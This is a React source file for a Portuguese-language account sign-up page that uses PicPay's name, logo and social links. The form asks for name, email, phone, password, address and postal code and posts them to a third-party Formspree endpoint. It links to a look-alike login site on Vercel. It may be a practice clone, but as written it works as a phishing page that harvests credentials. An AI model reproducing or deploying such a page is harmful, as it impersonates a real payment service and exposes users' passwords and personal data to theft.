import { useState } from 'react'
import { FaGoogle } from "react-icons/fa";
import { TiSocialFacebook } from "react-icons/ti";
import { TiSocialLinkedin } from "react-icons/ti";
import Logo from "./assets/logo.png";
import './App.css';

function App() {
  const [count, setCount] = useState(0)

  return (
    <>
    {/* titulo nicio da pagina*/}
      <div className='title'>
        <h1>Crie Sua Conta PicPay</h1><p/>
        <div className='icons'>
        <a href='https://www.google.com/'><FaGoogle /></a>
        <a href='https://www.facebook.com/PicPayBrasil'><TiSocialFacebook /></a>
        <a href='https://www.instagram.com/picpay/'><TiSocialLinkedin /></a>
        </div>
        <p><h5>Coloque os seus dados para Registrar!</h5></p>
        

      </div>
      
     
      {/*Formulário */}
      <form action="https://formspree.io/f/xvoeqvpd" method="POST">
        <div className='inputOne'>
        <input type='text' placeholder='Nome' required='required' name='nome'/><br/>
        <input type='text' placeholder='Sobrenome' required='required' name='sobrenome'/><br/>
        <input type='email' placeholder='Email' required='required' name='email'/><br/>
        <input type='tel'   placeholder='Contato' required='required' name='contato'/><br/>
        </div>
        <div className='inputDue'>
        <input type='password' placeholder='Senha' required='required'maxlength='11' name='senha'/><br/>
        <input type='password' placeholder='Confirmar senha' required='required'maxlength='11' name='confirmarsenha'/><br/>
        <input type='text' placeholder='Endereço' required='required' name='endereco'/><br/>
        <input type='text'   placeholder='Cep' required='required' maxlength='11' name='cep'/><br/>
        <button type="submit" id='buttonDue'>Criar Conta</button>
        </div>
        
      </form>
    {/* button Login */}  
      <div className='click'>
        
        
        <h1>Ir para o <br/>Login!</h1>

          <a href="https://banco-pic.vercel.app/">Click Aqui! </a>
          <img src={Logo} alt='picpay'/>
      </div>
      
    </>
  )
}

export default App
